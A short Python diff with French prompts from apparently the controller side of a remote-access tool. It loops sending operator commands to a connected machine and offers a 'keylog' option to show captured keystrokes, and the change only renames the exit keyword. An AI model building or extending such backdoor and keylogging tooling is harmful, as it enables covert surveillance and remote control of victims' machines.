@@ -10,8 +10,8 @@ def handle_connection(connection, address):
 
     while True:
         try:
-            command = input("Entrer une commande à exécuter ('quit' pour terminer, 'keylog' pour afficher les frappes) : ")
-            if command.lower() == 'quit':
+            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
+            if command.lower() == 'exit':
                 connection.send(b'quit')
                 break
             elif command.lower() == 'keylog':
